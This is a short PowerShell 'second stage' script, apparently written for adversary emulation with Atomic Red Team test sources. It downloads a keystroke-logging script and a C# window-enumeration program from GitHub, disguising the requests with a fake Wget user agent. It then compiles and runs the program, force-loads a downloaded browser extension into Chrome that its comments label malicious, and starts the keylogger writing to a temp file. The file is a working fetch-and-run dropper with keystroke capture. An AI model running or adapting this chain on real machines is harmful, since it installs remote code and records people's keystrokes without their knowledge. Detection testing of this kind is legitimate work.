#2nd stage params
#key-logger-params
$key_logger_script_url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1"
$dest_logger_script = "$env:TEMP\key-logger.ps1"
$key_logger_logs = "$env:TEMP\key_logger_logs.txt"

#windows-event-checker-params
$windows_event_checker_script_url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs"
$dest_windows_event_checker_script = "$env:TEMP\windows-event-checker.cs"
$bin_windows_event_checker = "$env:TEMP\windows-event-checker.exe"

#malicus-extension-params
$extension_url = "https://github.com/gorhill/uBlock/releases/download/uBOLite_0.1.23.6055/uBOLite_0.1.23.6055.chromium.mv3.zip"
$dest_extension = "$env:TEMP\extension.zip"
$bin_chrome = "C:\Program Files\Google\Chrome\Application\chrome.exe"

#downloads
Invoke-WebRequest -URI $key_logger_script_url -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" -OutFile $dest_logger_script
Invoke-WebRequest -URI $windows_event_checker_script_url -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" -OutFile $dest_windows_event_checker_script
Invoke-WebRequest -URI $extension_url -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" -OutFile $dest_extension

#execution
#check-eventos
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:$bin_windows_event_checker $dest_windows_event_checker_script
Start-Process $bin_windows_event_checker

#extension-maliciosa
Expand-Archive $dest_extension -Force
Start-Process $bin_chrome --load-extension="$env:TEMP\extension\" -PassThru

#key-logger
&"$dest_logger_script" -LogPath "$key_logger_logs" -TimeOut 10
